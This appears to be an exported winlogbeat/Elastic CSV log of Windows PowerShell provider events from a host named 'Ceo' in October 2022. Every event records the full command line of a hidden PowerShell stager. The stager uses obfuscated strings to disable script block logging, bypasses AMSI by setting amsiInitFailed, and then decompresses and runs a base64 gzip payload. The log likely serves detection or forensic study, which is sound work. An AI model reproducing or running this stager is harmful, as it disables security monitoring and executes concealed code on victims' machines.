$chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4561,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.191",gHkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4558,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.176",fnkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; 